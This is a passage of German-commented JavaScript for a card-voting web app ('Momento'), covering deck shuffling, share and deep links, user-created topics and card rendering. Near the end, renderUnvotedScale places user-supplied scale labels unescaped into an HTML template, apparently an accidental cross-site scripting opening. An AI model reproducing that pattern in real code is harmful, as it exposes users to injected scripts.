  const preview = document.getElementById('vibe-preview-box');
  if (preview) {
    Object.values(vibes).forEach(vClass => {
      vClass.split(' ').forEach(cls => preview.classList.remove(cls));
    });
    if (vibes[vibeKey]) {
      vibes[vibeKey].split(' ').forEach(cls => preview.classList.add(cls));
    }
    preview.innerText = vibeFriendlyNames[vibeKey] || vibeKey;
  }

  closeVibeOverlay();
}

function openStickerOverlay() {
  const overlay = document.getElementById('sticker-overlay');
  if (overlay) overlay.classList.remove('hidden');
  initStickerOverlay();
}

function closeStickerOverlay() {
  const overlay = document.getElementById('sticker-overlay');
  if (overlay) overlay.classList.add('hidden');
}

function updateStickerPreview(sticker) {
  const preview = document.getElementById('sticker-preview-box');
  if (!preview) return;

  preview.innerText = sticker;
  preview.classList.remove('text-xl', 'text-lg', 'text-base');

  const count = Array.from(sticker).length;
  if (count === 1) {
    preview.classList.add('text-xl');
  } else if (count === 2) {
    preview.classList.add('text-lg');
  } else {
    preview.classList.add('text-base');
  }
}

function getPreferredVersionIndex(topic) {
  if (!topic || !topic.versions) return 0;
  const mineIdx = topic.versions.findIndex(v => v.isMine === true);
  return mineIdx !== -1 ? mineIdx : 0;
}

window.selectCreateType = function(type) {
  const typeInput = document.getElementById('create-type');
  if (typeInput) typeInput.value = type;

  const buttons = {
    choice: document.getElementById('type-btn-choice'),
    versus: document.getElementById('type-btn-versus')
  };

  const baseClasses = "py-2.5 rounded-xl text-xs font-black uppercase tracking-wider transition-all leading-none";
  const activeClasses = "bg-retro-accent text-white shadow-md";
  const inactiveClasses = "text-retro-muted hover:text-retro-text";

  Object.keys(buttons).forEach(key => {
    const btn = buttons[key];
    if (!btn) return;
    btn.className = `${baseClasses} ${key === type ? activeClasses : inactiveClasses}`;
  });

  const wrappers = {
    choice: document.getElementById('wrapper-create-choice'),
    versus: document.getElementById('wrapper-create-versus')
  };

  Object.keys(wrappers).forEach(key => {
    const wrapper = wrappers[key];
    if (!wrapper) return;
    if (key === type) {
      wrapper.classList.remove('hidden');
    } else {
      wrapper.classList.add('hidden');
    }
  });
};

function shuffleDeck(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

function applyFiltersAndShuffle() {
  const searchInput = document.getElementById('search-input');
  const query = searchInput ? searchInput.value.toLowerCase().trim() : '';
  const urlParams = new URLSearchParams(window.location.search);
  const topicParam = urlParams.get('topic') || urlParams.get('card');
  const versionParam = urlParams.get('v');
  
  let baseList = [...masterTopics];

  if (query) {
    baseList = baseList.filter(topic => {
      const titleMatch = topic.title && topic.title.toLowerCase().includes(query);
      const versionMatch = topic.versions.some(v => 
        (v.question && v.question.toLowerCase().includes(query))
      );
      const catMatch = (topic.category === 'damals' ? "damals nostalgie" : "heute daily vibe").includes(query);
      return titleMatch || versionMatch || catMatch;
    });
  }

  if (topicParam && !query) {
    const deepTopicIndex = baseList.findIndex(t => t.id === topicParam);
    if (deepTopicIndex !== -1) {
      const deepTopic = baseList.splice(deepTopicIndex, 1)[0];
      shuffleDeck(baseList);
      filteredTopics = [deepTopic, ...baseList];
      
      if (versionParam) {
        const vIdx = deepTopic.versions.findIndex(v => v.id === versionParam);
        currentVersionIndex = vIdx !== -1 ? vIdx : getPreferredVersionIndex(deepTopic);
      } else {
        currentVersionIndex = getPreferredVersionIndex(deepTopic);
      }
    } else {
      shuffleDeck(baseList);
      filteredTopics = [...baseList];
      currentVersionIndex = getPreferredVersionIndex(filteredTopics[0]);
    }
  } else {
    shuffleDeck(baseList);
    filteredTopics = [...baseList];
    currentVersionIndex = getPreferredVersionIndex(filteredTopics[0]);
  }

  currentTopicIndex = 0;
  renderCard(currentTopicIndex, currentVersionIndex);
}

function resetDeck() {
  clearSearch();
  applyFiltersAndShuffle();
}

function trackEvent(eventName, eventData = {}) {
  console.log(`[Analytics Tracked]: ${eventName}`, eventData);
}

// Wird beim Start der App aufgerufen, BEVOR die erste Karte gerendert wird
// (siehe Initialisierung ganz unten in der Datei), damit estimateContext
// schon feststeht, sobald renderCard() das erste Mal läuft.
// Async, weil neue Fremdeinschätzungs-Links (?shareId=...) erst beim Server
// nachgefragt werden müssen, um die Meta-Infos zu bekommen.
// Prüft, ob die aktuelle URL auf ein Thema (?topic=...) bzw. eine konkrete
// Version (&v=...) zeigt, die im eigenen Browser NOCH NICHT bekannt sind,
// und lädt sie in diesem Fall vom Server nach. Das deckt zwei Fälle ab:
//
//   1) Komplett neues, selbsterstelltes Thema eines Freundes
//      (topic.id ist im lokalen masterTopics-Array gar nicht vorhanden).
//   2) Ein Freund hat eine EIGENE VERSION zu einem bereits bekannten,
//      eingebauten Thema hinzugefügt (Thema an sich ist lokal bekannt,
//      aber genau diese eine Version fehlt).
//
// Läuft VOR applyFiltersAndShuffle(), damit die Karte beim ersten Rendern
// schon vollständig vorhanden ist – kein sichtbares "Nachladen" nötig.
async function resolveMissingTopicFromServer() {
  const urlParams = new URLSearchParams(window.location.search);
  const topicParam = urlParams.get('topic') || urlParams.get('card');
  const versionParam = urlParams.get('v');

  if (!topicParam) return; // Kein Deep-Link auf ein bestimmtes Thema -> nichts zu tun.

  const localTopic = masterTopics.find(t => t.id === topicParam);
  const localVersionMissing = localTopic && versionParam
    ? !localTopic.versions.some(v => v.id === versionParam)
    : false;

  const needsServerFetch = !localTopic || localVersionMissing;
  if (!needsServerFetch) return;

  try {
    const serverTopic = await fetchTopicFromServer(topicParam);

    if (!localTopic) {
      // Fall 1: Das ganze Thema fehlt lokal -> komplett übernehmen.
      masterTopics.push(serverTopic);
    } else {
      // Fall 2: Thema ist bekannt, aber es fehlen eine oder mehrere
      // Versionen -> nur die neuen/fehlenden Versionen ergänzen, damit
      // eigene lokale Änderungen (z.B. die eigene "isMine"-Version) nicht
      // überschrieben werden.
      serverTopic.versions.forEach(serverVersion => {
        const alreadyThere = localTopic.versions.some(v => v.id === serverVersion.id);
        if (!alreadyThere) {
          localTopic.versions.push(serverVersion);
        }
      });
    }
  } catch (err) {
    // Kein Absturz: Die App zeigt dann einfach nicht die exakte geteilte
    // Karte an, sondern (wie bisher schon) einen normalen, gemischten Stapel.
    console.warn(`Geteiltes Thema "${topicParam}" konnte nicht vom Server geladen werden:`, err.message);
  }
}

async function handleDeepLinks() {
  const urlParams = new URLSearchParams(window.location.search);
  const fromUser = urlParams.get('from');
  const mode = urlParams.get('mode') || 'match';
  const topicParam = urlParams.get('topic') || urlParams.get('card');
  const versionParam = urlParams.get('v');
  const shareId = urlParams.get('shareId');
  // Alte Links (vor der Backend-Anbindung) hatten den echten Wert direkt in
  // der URL stehen ('val', ganz früher 'vote'). Bleibt als Fallback erhalten,
  // damit bereits verschickte Links nicht kaputtgehen.
  const legacyCreatorVal = urlParams.get('val') ?? urlParams.get('vote');

  if (!fromUser) return;

  let isEstimateLink = false;
  let creatorNameForBanner = fromUser;

  if (mode === 'estimate' && shareId) {
    // Neuer, sicherer Weg: Meta-Infos beim Server abfragen. Der echte Wert
    // (creatorVal) ist hier bewusst NICHT dabei – der kommt erst nach der
    // eigenen Antwort vom Server zurück (siehe setupEstimateReveal).
    try {
      const meta = await fetchEstimateMeta(shareId);
      estimateContext = {
        creatorName: meta.creatorName,
        creatorVal: null,
        topicId: meta.topicId,
        versionId: meta.versionId,
        shareId: meta.shareId,
        resolvedFromServer: true
      };
      isEstimateLink = true;
      creatorNameForBanner = meta.creatorName;
    } catch (err) {
      console.warn('Fremdeinschätzungs-Link konnte nicht geladen werden:', err.message);
      // Kein Absturz: die App zeigt einfach keinen Fremdeinschätzungs-Banner an.
    }
  } else if (mode === 'estimate' && legacyCreatorVal !== null && topicParam) {
    // Alter Link ohne Backend-Anbindung: Wert stand direkt im Link.
    estimateContext = {
      creatorName: fromUser,
      creatorVal: legacyCreatorVal,
      topicId: topicParam,
      versionId: versionParam || null,
      shareId: null,
      resolvedFromServer: false
    };
    isEstimateLink = true;
  }

  const banner = document.getElementById('invite-banner');
  const textEl = document.getElementById('invite-text');
  const subtextEl = document.getElementById('invite-subtext');

  if (isEstimateLink) {
    if (textEl) textEl.innerText = `🎯 @${creatorNameForBanner} möchte wissen:`;
    if (subtextEl) subtextEl.innerText = `Wie schätzt du @${creatorNameForBanner} auf dieser Skala ein?`;
  } else {
    if (textEl) textEl.innerText = `@${fromUser}s Vibe-Link`;
    if (legacyCreatorVal !== null && subtextEl) {
      subtextEl.innerText = `@${fromUser} hat abgestimmt. Was sagst du?`;
    }
  }

  if (banner) banner.classList.remove('hidden');
}

// Prüft, ob die aktuell angezeigte Karte diejenige ist, für die ein
// Fremdeinschätzungs-Link geöffnet wurde (nur dann greift der Estimate-Flow).
function isEstimateActiveFor(topic, version) {
  if (!estimateContext || !topic || !version) return false;
  if (estimateContext.topicId !== topic.id) return false;
  if (estimateContext.versionId && estimateContext.versionId !== version.id) return false;
  return true;
}

// Setzt den Text des "Auflösen"-Buttons passend zum aktiven Modus.
function updateRevealButtonText(topic, version) {
  const revealText = document.getElementById('btn-reveal-match-text');
  if (!revealText) return;
  revealText.innerText = isEstimateActiveFor(topic, version)
    ? "Auflösung anzeigen 🎯"
    : "Momento-Match checken ⚡";
}

function getShareableUrl() {
  const topic = filteredTopics[currentTopicIndex];
  if (!topic) return window.location.href;
  const version = topic.versions[currentVersionIndex];
  const baseUrl = window.location.origin + window.location.pathname;
  
  let shareUrl = `${baseUrl}?topic=${topic.id}&v=${version.id}`;
  const savedNickname = localStorage.getItem('kiosk_nickname');
  if (savedNickname) shareUrl += `&from=${encodeURIComponent(savedNickname)}`;
  if (selectedChoice) shareUrl += `&vote=${encodeURIComponent(selectedChoice)}`;
  return shareUrl;
}

function openCommentsSheet() {
  const sheet = document.getElementById('comments-sheet');
  const backdrop = document.getElementById('comments-sheet-backdrop');
  if (!sheet || !backdrop) return;

  backdrop.classList.remove('hidden');
  setTimeout(() => {
    backdrop.classList.add('opacity-100');
    backdrop.classList.remove('opacity-0');
    sheet.classList.remove('translate-y-full');
  }, 10);
}

function closeCommentsSheet() {
  const sheet = document.getElementById('comments-sheet');
  const backdrop = document.getElementById('comments-sheet-backdrop');
  if (!sheet || !backdrop) return;

  sheet.classList.add('translate-y-full');
  backdrop.classList.add('opacity-0');
  backdrop.classList.remove('opacity-100');
  setTimeout(() => {
    backdrop.classList.add('hidden');
  }, 300);
}

// FORMATIERT DIE RÜCKSEITE FÜR EINEN NEUEN BEITRAG
function openCreateTopicModal(direction = 'right') {
  const modeInput = document.getElementById('create-mode');
  if (modeInput) modeInput.value = 'new';
  
  const modalHeader = document.querySelector('#share-card-back h2');
  const modalSub = document.querySelector('#share-card-back p');
  
  if (modalHeader) modalHeader.innerText = "Neues Thema erstellen";
  if (modalSub) modalSub.innerText = "Füge der Gemischten Tüte ein komplett neues Thema hinzu.";
  
  const fieldNew = document.getElementById('field-new-topic');
  const fieldContrib = document.getElementById('field-contrib-topic');
  const createTitle = document.getElementById('create-title');

  if (fieldNew) fieldNew.classList.remove('hidden');
  if (fieldContrib) fieldContrib.classList.add('hidden');
  if (createTitle) {
    createTitle.required = true;
    createTitle.value = "";
  }
  
  ['create-opt1', 'create-opt2', 'create-opt3', 'create-left-label', 'create-right-label'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.value = "";
  });

  const deleteBtn = document.getElementById('modal-action-delete');
  if (deleteBtn) deleteBtn.classList.add('hidden');
  
  const vibeEl = document.getElementById('create-vibe');
  const stickerEl = document.getElementById('create-sticker');
  if (vibeEl) vibeEl.value = "sunset";
  if (stickerEl) stickerEl.value = "🍟";
  
  const preview = document.getElementById('vibe-preview-box');
  if (preview) {
    Object.values(vibes).forEach(vClass => {
      vClass.split(' ').forEach(cls => preview.classList.remove(cls));
    });
    if (vibes["sunset"]) vibes["sunset"].split(' ').forEach(cls => preview.classList.add(cls));
    preview.innerText = vibeFriendlyNames["sunset"];
  }

  updateStickerPreview("🍟");
  selectCreateType('choice');
  safeCreateIcons();

  if (!isFlipped) toggleFlip(direction);
}

// FORMATIERT DIE RÜCKSEITE ZUM BEARBEITEN DES AKTUELLEN THEMAS
function openContribForCurrentTopic(direction = 'right') {
  const topic = filteredTopics[currentTopicIndex];
  if (!topic) return;

  const activeVersion = topic.versions[currentVersionIndex];
  const myVersion = topic.versions.find(v => v.isMine === true);

  const modeInput = document.getElementById('create-mode');
  if (modeInput) modeInput.value = myVersion ? 'edit' : 'contrib';
  
  const modalHeader = document.querySelector('#share-card-back h2');
  const modalSub = document.querySelector('#share-card-back p');
  
  const fieldNew = document.getElementById('field-new-topic');
  const fieldContrib = document.getElementById('field-contrib-topic');
  const createTitle = document.getElementById('create-title');

  if (fieldNew) fieldNew.classList.add('hidden');
  if (fieldContrib) fieldContrib.classList.remove('hidden');
  if (createTitle) createTitle.required = false;

  if (fieldContrib) {
    fieldContrib.innerHTML = `
      <label class="font-bold text-retro-muted text-xs uppercase tracking-wider">Thema</label>
      <div class="w-full bg-retro-subtle/60 border border-retro-border rounded-xl px-3 py-2.5 text-lg sm:text-xl font-black text-retro-text tracking-tight shadow-inner">
        ${escapeHtml(topic.title)}
      </div>
      <input type="hidden" id="create-existing-select" value="${escapeHtml(topic.id)}">
    `;
  }

  const activeVibe = myVersion ? (myVersion.vibe || "sunset") : (activeVersion?.vibe || "sunset");
  const activeSticker = myVersion ? (myVersion.sticker || "🍟") : (activeVersion?.sticker || "🍟");

  const vibeEl = document.getElementById('create-vibe');
  const stickerEl = document.getElementById('create-sticker');
  if (vibeEl) vibeEl.value = activeVibe;
  if (stickerEl) stickerEl.value = activeSticker;

  const preview = document.getElementById('vibe-preview-box');
  if (preview) {
    Object.values(vibes).forEach(vClass => {
      vClass.split(' ').forEach(cls => preview.classList.remove(cls));
    });
    if (vibes[activeVibe]) vibes[activeVibe].split(' ').forEach(cls => preview.classList.add(cls));
    preview.innerText = vibeFriendlyNames[activeVibe] || activeVibe;
  }

  updateStickerPreview(activeSticker);

  const opt1 = document.getElementById('create-opt1');
  const opt2 = document.getElementById('create-opt2');
  const opt3 = document.getElementById('create-opt3');

  const typeToSet = myVersion ? (myVersion.type || "choice") : (activeVersion?.type || "choice");
  selectCreateType(typeToSet);

  const deleteBtn = document.getElementById('modal-action-delete');
  if (deleteBtn) deleteBtn.classList.toggle('hidden', !myVersion);

  if (myVersion) {
    if (modalHeader) modalHeader.innerText = "Deine Version ändern";
    if (modalSub) modalSub.innerText = "Bearbeite deine Antworten und das Design.";

    if (typeToSet === 'choice') {
      if (opt1) opt1.value = myVersion.options[0]?.name || "";
      if (opt2) opt2.value = myVersion.options[1]?.name || "";
      if (opt3) opt3.value = myVersion.options[2]?.name || "";
    } else if (typeToSet === 'versus') {
      const left = document.getElementById('create-left-label');
      const right = document.getElementById('create-right-label');
      if (left) left.value = myVersion.leftLabel || "";
      if (right) right.value = myVersion.rightLabel || "";
    }
  } else {
    if (modalHeader) modalHeader.innerText = "Version beisteuern";
    if (modalSub) modalSub.innerText = "Erstelle deine eigene Version mit eigenem Vibe & Sticker.";

    ['create-opt1', 'create-opt2', 'create-opt3', 'create-left-label', 'create-right-label'].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.value = "";
    });
  }
  safeCreateIcons();

  if (!isFlipped) toggleFlip(direction);
}

function handleCreateCardSubmit(e) {
  e.preventDefault();
  
  const mode = document.getElementById('create-mode')?.value;
  const defaultQuestion = selectedTemplateType === 'damals' ? "Kennst du das auch noch?" : "Fühlst du diesen Vibe?";
  const userNickname = localStorage.getItem('kiosk_nickname') || "Community";

  const vibe = document.getElementById('create-vibe')?.value || "sunset";
  const sticker = document.getElementById('create-sticker')?.value.trim() || "✨";
  const type = document.getElementById('create-type')?.value || "choice";

  let targetTopicId = "";

  if (mode === 'new') {
    const title = document.getElementById('create-title')?.value.trim() || "Neues Thema";
    targetTopicId = "topic-" + Date.now();
    
    let newVersion = {
      id: "version-" + Date.now(),
      author: userNickname,
      question: defaultQuestion,
      vibe: vibe,
      sticker: sticker,
      type: type,
      isMine: true
    };

    if (type === 'choice') {
      const opt1 = document.getElementById('create-opt1')?.value.trim() || "Option A";
      const opt2 = document.getElementById('create-opt2')?.value.trim() || "Option B";
      const opt3 = document.getElementById('create-opt3')?.value.trim() || "Option C";
      newVersion.options = [
        { name: opt1, percent: "33%" },
        { name: opt2, percent: "33%" },
        { name: opt3, percent: "34%" }
      ];
    } else if (type === 'versus') {
      newVersion.leftLabel = document.getElementById('create-left-label')?.value.trim() || "Links";
      newVersion.rightLabel = document.getElementById('create-right-label')?.value.trim() || "Rechts";
      newVersion.stats = { communityAverage: 50 };
    }

    let newTopic = {
      id: targetTopicId,
      title: title,
      category: selectedTemplateType,
      memories: [],
      versions: [newVersion]
    };
    masterTopics.push(newTopic);
    
    saveCustomTopics();
    applyFiltersAndShuffle();

    // Thema zusätzlich zum Server hochladen, damit Freunde es über den
    // Share-Link öffnen können, auch wenn es bei ihnen lokal unbekannt ist.
    uploadCustomTopicToServer(newTopic).catch(err => {
      console.warn('Thema konnte nicht mit dem Server synchronisiert werden:', err.message);
    });

    const foundIdx = filteredTopics.findIndex(t => t.id === targetTopicId);
    if (foundIdx !== -1) {
      currentTopicIndex = foundIdx;
      currentVersionIndex = 0;
    }

  } else if (mode === 'contrib' || mode === 'edit') {
    targetTopicId = document.getElementById('create-existing-select')?.value;
    const topic = masterTopics.find(t => t.id === targetTopicId);
    if (topic) {
      const existingMine = topic.versions.find(v => v.isMine === true);
      
      if (existingMine) {
        existingMine.vibe = vibe;
        existingMine.sticker = sticker;
        existingMine.type = type;

        if (type === 'choice') {
          const opt1 = document.getElementById('create-opt1')?.value.trim() || "Option A";
          const opt2 = document.getElementById('create-opt2')?.value.trim() || "Option B";
          const opt3 = document.getElementById('create-opt3')?.value.trim() || "Option C";
          existingMine.options = [
            { name: opt1, percent: "33%" },
            { name: opt2, percent: "33%" },
            { name: opt3, percent: "34%" }
          ];
          delete existingMine.leftLabel; delete existingMine.rightLabel;
          delete existingMine.minLabel; delete existingMine.maxLabel;
        } else if (type === 'versus') {
          existingMine.leftLabel = document.getElementById('create-left-label')?.value.trim() || "Links";
          existingMine.rightLabel = document.getElementById('create-right-label')?.value.trim() || "Rechts";
          delete existingMine.options;
          delete existingMine.minLabel; delete existingMine.maxLabel;
        }
      } else {
        let newVersion = {
          id: "version-" + Date.now(),
          author: userNickname,
          question: defaultQuestion,
          vibe: vibe,
          sticker: sticker,
          type: type,
          isMine: true
        };

        if (type === 'choice') {
          const opt1 = document.getElementById('create-opt1')?.value.trim() || "Option A";
          const opt2 = document.getElementById('create-opt2')?.value.trim() || "Option B";
          const opt3 = document.getElementById('create-opt3')?.value.trim() || "Option C";
          newVersion.options = [
            { name: opt1, percent: "33%" },
            { name: opt2, percent: "33%" },
            { name: opt3, percent: "34%" }
          ];
        } else if (type === 'versus') {
          newVersion.leftLabel = document.getElementById('create-left-label')?.value.trim() || "Links";
          newVersion.rightLabel = document.getElementById('create-right-label')?.value.trim() || "Rechts";
          newVersion.stats = { communityAverage: 50 };
        }
        topic.versions.push(newVersion);
      }
    }
    
    saveCustomTopics();
    applyFiltersAndShuffle();

    // Auch hier: aktualisiertes Thema (inkl. neuer/geänderter eigener
    // Version) zum Server hochladen, damit Freunde per Share-Link auch
    // GENAU diese Version sehen – nicht nur das Grundthema.
    const updatedTopic = masterTopics.find(t => t.id === targetTopicId);
    if (updatedTopic) {
      uploadCustomTopicToServer(updatedTopic).catch(err => {
        console.warn('Thema konnte nicht mit dem Server synchronisiert werden:', err.message);
      });
    }

    const foundIdx = filteredTopics.findIndex(t => t.id === targetTopicId);
    if (foundIdx !== -1) {
      currentTopicIndex = foundIdx;
      currentVersionIndex = filteredTopics[foundIdx].versions.findIndex(v => v.isMine === true);
      if (currentVersionIndex === -1) currentVersionIndex = 0;
    }
  }

  renderCard(currentTopicIndex, currentVersionIndex);
  const form = document.getElementById('create-card-form');
  if (form) form.reset();
  
  if (isFlipped) toggleFlip();
}

function saveCustomTopics() {
  const customOnes = masterTopics.map(t => {
    const hasCustomVersions = t.versions.some(v => v.id.startsWith('version-') || v.isMine);
    if (t.id.startsWith('topic-') || hasCustomVersions) {
      return t;
    }
    return null;
  }).filter(Boolean);
  localStorage.setItem('kiosk_custom_topics', JSON.stringify(customOnes));
}

function deleteMyVersion() {
  const topic = filteredTopics[currentTopicIndex];
  if (!topic) return;
  const version = topic.versions.find(v => v.isMine === true);

  if (!version) return;

  const confirmDelete = confirm(`Möchtest du deine Version zu "${topic.title}" wirklich unwiderruflich löschen?`);
  if (!confirmDelete) return;

  const topicInMaster = masterTopics.find(t => t.id === topic.id);
  if (topicInMaster) {
    topicInMaster.versions = topicInMaster.versions.filter(v => v.id !== version.id);
    
    if (topicInMaster.versions.length === 0) {
      masterTopics = masterTopics.filter(t => t.id !== topic.id);
    }
  }

  saveCustomTopics();
  localStorage.removeItem(`kiosk_vote_${topic.id}_${version.id}`);
  
  if (isFlipped) toggleFlip();
  
  applyFiltersAndShuffle();
  trackEvent("delete_my_version", { topic: topic.title, version: version.id });
}

function toggleSearch() {
  const container = document.getElementById('search-container');
  const input = document.getElementById('search-input');
  if (!container) return;
  
  if (container.classList.contains('hidden')) {
    container.classList.remove('hidden');
    if (input) input.focus();
  } else {
    container.classList.add('hidden');
    clearSearch();
  }
  safeCreateIcons();
}

let isTransitioning = false;

function navigate(action) {
  if (isTransitioning) return;
  isTransitioning = true;
  
  if (action === 'topic-next') {
    currentTopicIndex = (currentTopicIndex + 1) % filteredTopics.length;
    const nextTopic = filteredTopics[currentTopicIndex];
    currentVersionIndex = getPreferredVersionIndex(nextTopic); 
  } else if (action === 'topic-prev') {
    currentTopicIndex = (currentTopicIndex - 1 + filteredTopics.length) % filteredTopics.length;
    const prevTopic = filteredTopics[currentTopicIndex];
    currentVersionIndex = getPreferredVersionIndex(prevTopic); 
  }

  renderCard(currentTopicIndex, currentVersionIndex);
  
  setTimeout(() => {
    isTransitioning = false;
  }, 450);
}

function handleSearch() {
  applyFiltersAndShuffle();
}

function renderCard(topicIndex, versionIndex) {
  const commentsBtnText = document.getElementById('comments-btn-text');
  const commentsBtn = commentsBtnText ? commentsBtnText.closest('button') : null;

  if (!filteredTopics.length) {
    const title = document.getElementById('card-title');
    if (title) title.innerText = "Keine Treffer";
    
    const imgContainer = document.getElementById('card-image-container');
    if (imgContainer) {
      imgContainer.className = "overflow-hidden rounded-xl border border-retro-border/80 shadow-sm relative h-28 sm:h-36 flex items-center justify-center bg-retro-subtle";
    }
    
    const stickerEl = document.getElementById('card-vibe-sticker');
    if (stickerEl) {
      stickerEl.innerText = "❓";
      stickerEl.className = "text-5xl sm:text-6xl filter drop-shadow-[0_8px_8px_rgba(0,0,0,0.35)] animate-pulse z-10 select-none";
    }

    const quizOptions = document.getElementById('quiz-options');
    if (quizOptions) quizOptions.innerHTML = "";
    
    const postVote = document.getElementById('post-vote-actions');
    if (postVote) postVote.classList.add('hidden');
    
    if (commentsBtn) commentsBtn.classList.add('hidden');
    return;
  }

  if (commentsBtn) commentsBtn.classList.remove('hidden');
  const topic = filteredTopics[topicIndex];
  const version = topic.versions[versionIndex];

  const glow = document.getElementById('bg-glow');
  if (glow) {
    if (topic.category === 'damals') {
      glow.className = "glow-effect absolute -right-10 -top-10 w-36 h-36 bg-amber-500/10 rounded-full blur-3xl pointer-events-none";
    } else {
      glow.className = "glow-effect absolute -right-10 -top-10 w-36 h-36 bg-pink-500/10 rounded-full blur-3xl pointer-events-none";
    }
  }

  const cardTitle = document.getElementById('card-title');
  if (cardTitle) cardTitle.innerText = topic.title;

  const activeVibe = version.vibe || "sunset";
  const activeSticker = version.sticker || "✨";

  const imgContainer = document.getElementById('card-image-container');
  if (imgContainer) {
    Object.values(vibes).forEach(vClass => {
      vClass.split(' ').forEach(cls => imgContainer.classList.remove(cls));
    });
    const gradientClass = vibes[activeVibe] || vibes["sunset"];
    gradientClass.split(' ').forEach(cls => imgContainer.classList.add(cls));
  }

  const stickerEl = document.getElementById('card-vibe-sticker');
  if (stickerEl) {
    stickerEl.innerText = activeSticker;
    stickerEl.classList.remove('text-5xl', 'sm:text-6xl', 'text-4xl', 'sm:text-5xl', 'text-3xl', 'sm:text-4xl', 'text-2xl', 'sm:text-3xl');

    const emojiCount = Array.from(activeSticker).length;
    if (emojiCount === 1) {
      stickerEl.classList.add('text-7xl', 'sm:text-8xl');
    } else if (emojiCount === 2) {
      stickerEl.classList.add('text-5xl', 'sm:text-6xl');
    } else {
      stickerEl.classList.add('text-4xl', 'sm:text-5xl');
    }
  }

  document.title = `Momento – ${topic.title}`;
  const ogTitle = document.getElementById('og-title');
  const ogDesc = document.getElementById('og-desc');
  if (ogTitle) ogTitle.setAttribute('content', `Momento – ${topic.title}`);
  if (ogDesc) ogDesc.setAttribute('content', version.question);

  const sponsorBadge = document.getElementById('sponsor-badge');
  if (sponsorBadge) {
    if (version.isSponsored) {
      const sponsorName = document.getElementById('sponsor-name');
      const sponsorLink = document.getElementById('sponsor-link');
      if (sponsorName) sponsorName.innerText = version.sponsorName || "Sponsor";
      if (sponsorLink) sponsorLink.href = version.sponsorLink || "#";
      sponsorBadge.classList.remove('hidden');
    } else {
      sponsorBadge.classList.add('hidden');
    }
  }

  // (Hinweis: Hier stand zuvor eine Zeile, die ein Element mit der ID
  // "nickname-input" ansprach - das existierte im Kommentar-Formular gar
  // nicht (siehe Bugfix in addMemory() weiter unten) und war daher toter
  // Code ohne Wirkung. Ersatzlos entfernt.)
  selectedChoice = "";

  const voteKey = `kiosk_vote_${topic.id}_${version.id}`;
  const previousVote = localStorage.getItem(voteKey);
  const postVoteActions = document.getElementById('post-vote-actions');

  // Neue Karte = neue Auflösung. Reveal-Status zurücksetzen.
  estimateRevealed = false;

  if (previousVote) {
    selectedChoice = previousVote;
    if (postVoteActions) postVoteActions.classList.remove('hidden');
    
    const matchSurprise = document.getElementById('match-surprise');
    if (matchSurprise) matchSurprise.classList.add('hidden');

    const estimateReveal = document.getElementById('estimate-reveal');
    if (estimateReveal) estimateReveal.classList.add('hidden');
    
    const revealBtn = document.getElementById('btn-reveal-match');
    if (revealBtn) revealBtn.classList.remove('hidden');
    updateRevealButtonText(topic, version);
  } else {
    if (postVoteActions) postVoteActions.classList.add('hidden');
    const matchSurprise = document.getElementById('match-surprise');
    if (matchSurprise) matchSurprise.classList.add('hidden');
    const estimateReveal = document.getElementById('estimate-reveal');
    if (estimateReveal) estimateReveal.classList.add('hidden');
  }

  renderOptions(topic, version, previousVote);
  // Läuft im Hintergrund (nicht awaited, renderCard bleibt synchron) und
  // zeichnet die Optionen neu, sobald echte Server-Zahlen da sind.
  refreshLiveStats(topic, version);
  // Ebenfalls im Hintergrund: eingebaute Beispiel-Kommentare sofort zeigen,
  // dann durch die echten, vom Server geladenen Kommentare ersetzen.
  loadCommentsForTopic(topic);
  safeCreateIcons();
  trackEvent("view_card", { topic: topic.title, version: version.id });
}

function hexToRgb(hex) {
  let h = hex.trim().replace('#', '');
  if (h.length === 3) h = h.split('').map(c => c + c).join('');
  const num = parseInt(h, 16);
  return { r: (num >> 16) & 255, g: (num >> 8) & 255, b: num & 255 };
}

function mixHexColors(hexA, hexB, t) {
  const a = hexToRgb(hexA);
  const b = hexToRgb(hexB);
  const r = Math.round(a.r + (b.r - a.r) * t);
  const g = Math.round(a.g + (b.g - a.g) * t);
  const bl = Math.round(a.b + (b.b - a.b) * t);
  return `rgb(${r}, ${g}, ${bl})`;
}

// Ampel-Farbverlauf fuer die Skala: Gruen in der Mitte (ausgeglichen),
// ueber Gelb zu Rot an den Raendern (extrem/polarisierend).
function getScaleColors(steps = 7) {
  const GREEN = '#22c55e';
  const YELLOW = '#eab308';
  const RED = '#ef4444';
  const colors = [];
  for (let i = 0; i < steps; i++) {
    const t = steps === 1 ? 0.5 : i / (steps - 1);
    const distanceFromCenter = Math.abs(t - 0.5) * 2;
    const color = distanceFromCenter <= 0.5
      ? mixHexColors(GREEN, YELLOW, distanceFromCenter / 0.5)
      : mixHexColors(YELLOW, RED, (distanceFromCenter - 0.5) / 0.5);
    colors.push(color);
  }
  return colors;
}

// Baut genau 7 Segmente fuer die Skala auf
function buildScaleSegments() {
  return getScaleColors(7)
    .map(c => `<div class="flex-1" style="background-color:${c};"></div>`)
    .join('');
}

// Text-Stufen fuer die 7 Segmente der Skala:
// Index 0-2 (Team A / Links), Index 3 (Neutral / Mitte), Index 4-6 (Team B / Rechts)
const scaleLabels = [
  "100% Team",       // Index 0
  "Klare Tendenz",   // Index 1
  "Eher",            // Index 2
  "Neutral",         // Index 3 (Mitte)
  "Eher",            // Index 4
  "Klare Tendenz",   // Index 5
  "100% Team"        // Index 6
];

// Rechnet Prozentwert (0-100) auf den 7-Stufen-Index (0 bis 6) um
function percentToScaleIndex(percent, totalSegments = 7) {
  const idx = Math.round((Number(percent) / 100) * totalSegments - 0.5);
  return Math.max(0, Math.min(totalSegments - 1, idx));
}

// Baut den Text fuer "Dein Vibe" / "Community Schnitt" (z.B. Klare Tendenz 'Mayo')
function formatVersusValue(val, leftLabel, rightLabel) {
  const idx = percentToScaleIndex(val, 7);
  const stufe = scaleLabels[idx];

  if (idx === 3) return stufe; // "Neutral"

  const sideLabel = idx < 3 ? leftLabel : rightLabel;
  return `${stufe} '${sideLabel}'`;
}

// Baut das leere Tipp-Feld für die Skala
function renderUnvotedScale(leftLabel, rightLabel) {
  return `
    <div class="space-y-3 py-1 animate-fade-in text-retro-text w-full">
      <div class="grid grid-cols-2 gap-3 text-sm sm:text-base font-black uppercase tracking-tight text-retro-text">
        <span class="text-left leading-snug break-words">${leftLabel}</span>
        <span class="text-right leading-snug break-words">${rightLabel}</span>
      </div>

